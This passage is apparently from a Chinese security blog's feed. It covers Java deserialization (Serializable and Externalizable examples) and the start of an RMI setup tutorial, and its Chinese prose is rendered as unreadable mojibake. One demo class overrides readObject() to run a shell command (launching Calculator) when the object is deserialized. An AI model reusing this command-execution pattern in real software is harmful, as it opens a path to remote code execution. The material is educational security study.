class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.testSer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">"hacked by ph0rse"</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()æ–¹æ³•å°†Unsafeå¯¹è±¡å†™å…¥objectæ–‡ä»¶</span></span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//æ¢å¤å¯¹è±¡</span></span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//é‡å†™readObject()æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        System.out.println(<span class="string">"my First!"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä½¿ç”¨<code>ObjectInputStream</code>è¯»å–åºåˆ—åŒ–æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨äº†<code>readObject()</code>, å½“ç„¶å°±ä¼šæˆåŠŸçš„æ‰§è¡Œå‘½ä»¤<br><img src="/Java ååºåˆ—åŒ–.resources/4AE8E45C-404B-4C71-B7E4-3F34724B622B.png" alt="91feac2fe936fc44a74b4558c29b5774"></p><p>å¹¶ä¸”ç¡®å®æ˜¯å…ˆæ‰§è¡Œäº†readObjectç±»çš„æ“ä½œï¼Œç„¶åå†è¿›è¡Œ<code>System.out.println(name)</code></p><h3 id="ObjectInputStream-amp-amp-ObjectOutputStream"><a href="#ObjectInputStream-amp-amp-ObjectOutputStream" class="headerlink" title="ObjectInputStream &amp;&amp; ObjectOutputStream"></a>ObjectInputStream &amp;&amp; ObjectOutputStream</h3><p>åºåˆ—åŒ–å¯¹è±¡: <code>java.io.ObjectOutputStream</code>-&gt;<code>writeObject()</code></p><p>ååºåˆ—åŒ–å¯¹è±¡: <code>java.io.ObjectInputStream</code>-&gt;<code>readObject()</code></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨åºåˆ—åŒ–ç±»æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å»</p><h4 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h4><p><img src="/Java ååºåˆ—åŒ–.resources/5D3785F2-BB16-410A-B71D-C528BBABD3A6.png" alt="353fe18d91d94771da7b2851b01803c5"></p><p>java.io.Serializableæ¥å£æ˜¯ç©ºæ¥å£ï¼Œä»…ä»…ç”¨äºè¡¨ç¤ºè¿™ä¸ªç±»å¯åºåˆ—åŒ–<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.demo;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializationTest</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> email;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.email = email;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºDeserializationTestç±»ï¼Œå¹¶ç±»è®¾ç½®å±æ€§å€¼</span></span><br><span class="line">            DeserializationTest t = <span class="keyword">new</span> DeserializationTest();</span><br><span class="line">            t.setUsername(<span class="string">"Patrilic"</span>);</span><br><span class="line">            t.setEmail(<span class="string">"admin@patrilic.top"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºJavaå¯¹è±¡åºåˆ—åŒ–è¾“å‡ºæµå¯¹è±¡</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åºåˆ—åŒ–DeserializationTestç±»</span></span><br><span class="line">            out.writeObject(t);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ‰“å°DeserializationTestç±»åºåˆ—åŒ–ä»¥åçš„å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–è€…é€šè¿‡Socketå‘é€åˆ°è¿œç¨‹æœåŠ¡åœ°å€</span></span><br><span class="line">            System.out.println(<span class="string">"DeserializationTestç±»åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„:"</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ©ç”¨DeserializationTestç±»ç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°ç»„åˆ›å»ºäºŒè¿›åˆ¶è¾“å…¥æµå¯¹è±¡ç”¨äºååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€šè¿‡ååºåˆ—åŒ–è¾“å…¥æµ(bais),åˆ›å»ºJavaå¯¹è±¡è¾“å…¥æµ(ObjectInputStream)å¯¹è±¡</span></span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ååºåˆ—åŒ–è¾“å…¥æµæ•°æ®ä¸ºDeserializationTestå¯¹è±¡</span></span><br><span class="line">            DeserializationTest test = (DeserializationTest) in.readObject();</span><br><span class="line">            System.out.println(<span class="string">"ç”¨æˆ·å:"</span> + test.getUsername() + <span class="string">",é‚®ç®±:"</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…³é—­ObjectInputStreamè¾“å…¥æµ</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/Java ååºåˆ—åŒ–.resources/C93A9FAE-DB5A-4FC1-BB1B-814DAE9F77AA.png" alt="76d9756e4aab867670c7fcda970c3c24"></p><ul><li>ä½¿ç”¨äº†ObjectOutputStream-&gt;writeObject()åºåˆ—åŒ–äº†DeserializationTestç±»</li><li>ä½¿ç”¨äº†ObjectInputStream-&gt;readObject()ååºåˆ—åŒ–äº†DeserializationTestç±»</li></ul><h4 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h4><p><img src="/Java ååºåˆ—åŒ–.resources/C69C1353-C5FC-42A8-A68A-278C3D22143B.png" alt="7d55817c04f81057ababfb388229de68"></p><p>java.io.Externalizableç»§æ‰¿Serializableæ¥å£ï¼Œå®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ul><li>writeExternal()</li><li>readExternal()</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizableTest</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Externalizable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.username = username;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> email;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.email = email;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeObject(username);</span><br><span class="line">        out.writeObject(email);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = (String) in.readObject();</span><br><span class="line">        <span class="keyword">this</span>.email = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºDeserializationTestç±»ï¼Œå¹¶ç±»è®¾ç½®å±æ€§å€¼</span></span><br><span class="line">        ExternalizableTest t = <span class="keyword">new</span> ExternalizableTest();</span><br><span class="line">            t.setUsername(<span class="string">"Patrilic"</span>);</span><br><span class="line">            t.setEmail(<span class="string">"admin@patrilic.top"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºJavaå¯¹è±¡åºåˆ—åŒ–è¾“å‡ºæµå¯¹è±¡</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åºåˆ—åŒ–DeserializationTestç±»</span></span><br><span class="line">            out.writeObject(t);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ‰“å°ExternalizableTestç±»åºåˆ—åŒ–ä»¥åçš„å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–è€…é€šè¿‡Socketå‘é€åˆ°è¿œç¨‹æœåŠ¡åœ°å€</span></span><br><span class="line">            System.out.println(<span class="string">"ExternalizableTestç±»åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„:"</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ©ç”¨ExternalizableTestç±»ç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°ç»„åˆ›å»ºäºŒè¿›åˆ¶è¾“å…¥æµå¯¹è±¡ç”¨äºååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€šè¿‡ååºåˆ—åŒ–è¾“å…¥æµ(bais),åˆ›å»ºJavaå¯¹è±¡è¾“å…¥æµ(ObjectInputStream)å¯¹è±¡</span></span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ååºåˆ—åŒ–è¾“å…¥æµæ•°æ®ä¸ºDeserializationTestå¯¹è±¡</span></span><br><span class="line">            ExternalizableTest test = (ExternalizableTest) in.readObject();</span><br><span class="line">            System.out.println(<span class="string">"ç”¨æˆ·å:"</span> + test.getUsername() + <span class="string">",é‚®ç®±:"</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å…³é—­ObjectInputStreamè¾“å…¥æµ</span></span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Java ååºåˆ—åŒ–.resources/29A572E8-12FE-4C0B-ABEB-7B0F8E126A20.png" alt="dbab49a33c3f7b5d91ac12675c425caf"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ä¸¤ä¸ªæ–¹æ³•çš„é‡å†™ï¼š<br><img src="/Java ååºåˆ—åŒ–.resources/8F677152-4C82-4947-80E3-1A318034B8AF.png" alt="ad0bec7b07149615601539047867463f"></p><h2 id="0x03-ç›¸å…³é“¾æ¥"><a href="#0x03-ç›¸å…³é“¾æ¥" class="headerlink" title="0x03 ç›¸å…³é“¾æ¥"></a>0x03 ç›¸å…³é“¾æ¥</h2><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041</a><br><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">https://javasec.org/javase/JavaDeserialization/Serialization.html</a><br><a href="https://xz.aliyun.com/t/2043" target="_blank" rel="noopener">https://xz.aliyun.com/t/2043</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-18 11:26:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_field_night.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://patrilic.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>RMI</title>
    <link href="http://patrilic.top/2020/03/17/RMI/"/>
    <id>http://patrilic.top/2020/03/17/RMI/</id>
    <published>2020-03-17T08:41:55.000Z</published>
    <updated>2020-03-17T08:51:11.826Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-17 16:41:55</p></blockquote><p><img src="/wallpaper/sky.jpg" alt></p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>RMI(Remote Method Invocation) - Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œ ç±»ä¼¼äºRPCï¼Œ å®ç°äº†Javaç¨‹åºè·¨JVMçš„çš„æ–¹æ³•è°ƒç”¨ã€‚<br>ç®€è€Œè¨€ä¹‹å°±æ˜¯èƒ½å¤Ÿåœ¨å¦ä¸€ä¸ªJVMä¸­è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ã€‚</p><h2 id="0x01-RMIç»„æˆ"><a href="#0x01-RMIç»„æˆ" class="headerlink" title="0x01 RMIç»„æˆ"></a>0x01 RMIç»„æˆ</h2><p>RMIåˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š </p><ul><li>å®¢æˆ·ç«¯Client</li><li>æœåŠ¡ç«¯Server</li><li>æ³¨å†Œä¸­å¿ƒRegistry</li></ul><p>(from <a href="https://javasec.org/javase/RMI/" target="_blank" rel="noopener">javasec</a>)<br>æ¶æ„å›¾ï¼š<br><img src="/RMI.resources/F59BB75C-985D-4077-A2C5-568E3A8F3D47.jpg" alt="f76f1d632cf4f6d09b1f45783932c320"></p><p>ç®€è¿°ä¸€ä¸‹RMIçš„è°ƒç”¨æµç¨‹ï¼š</p><ol><li>RMIå®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»ºStub(sun.rmi.registry.RegistryImpl_Stub)ã€‚</li><li>Stubä¼šå°†Remoteå¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚(java.rmi.server.RemoteRef)å¹¶åˆ›å»ºjava.rmi.server.RemoteCall(è¿œç¨‹è°ƒç”¨)å¯¹è±¡ã€‚</li><li>RemoteCallåºåˆ—åŒ–RMIæœåŠ¡åç§°ã€Remoteå¯¹è±¡ã€‚</li><li>RMIå®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“RemoteCallåºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡Socketè¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ°RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚</li><li>RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚(sun.rmi.server.UnicastServerRef)æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)ã€‚</li><li>Skeletonè°ƒç”¨RemoteCallååºåˆ—åŒ–RMIå®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚</li><li>Skeletonå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯lookupåˆ™æŸ¥æ‰¾RMIæœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡RemoteCallä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚</li><li>RMIå®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚</li><li>RMIå®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</li><li>RMIå®¢æˆ·ç«¯ååºåˆ—åŒ–RMIè¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚</li></ol><p>ä½†æ˜¯ä»ä¸Šè¿°æ–‡å­—ä¸­å°±äº§ç”Ÿä¸€ä¸ªç–‘é—®ï¼ŒClientæ˜¯ç›´æ¥è·å–æœåŠ¡ç«¯çš„æ–¹æ³•æ‰§è¡Œç»“æœï¼Œè€Œç±»çš„æ‰§è¡Œæ˜¯åœ¨Serverç«¯ï¼Œé‚£ä¹ˆä¾‹å¦‚fastjsonè¿™ç§ï¼Œå®ƒçš„å‘½ä»¤æ‰§è¡Œåˆæ˜¯åœ¨Clientäº§ç”Ÿâ€¦?</p><h2 id="0x02-RMIæ­å»º"><a href="#0x02-RMIæ­å»º" class="headerlink" title="0x02 RMIæ­å»º"></a>0x02 RMIæ­å»º</h2><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><p>åˆ›å»ºä¸€ä¸ªJava Project - <code>RMIServiceExample</code><br>åˆ›å»ºPackage - <code>com.patrilic.rmi</code><br>é¦–å…ˆæ„é€ ä¸€ä¸ªpublicæ¥å£<code>RMIServiceAPI</code>ï¼Œéœ€è¦ç»§æ‰¿Remoteï¼ŒåŒæ—¶throws RemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServiceAPI</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ„é€ ä¸€ä¸ªClasså®ç°</p><ul><li>éœ€è¦ç»§æ‰¿UnicastRemoteObjectç±»ï¼ŒåŒæ—¶å®ç°RMIServiceAPIæ¥å£</li><li>æ„é€ å‡½æ•°éœ€è¦æŠ›å‡ºRemoteException</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RMIServiceAPI</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">RMIService</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"><span class="keyword">super</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call from"</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ„é€ ä¸€ä¸ªStartService.java,ç”¨äºæ³¨å†ŒæœåŠ¡ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 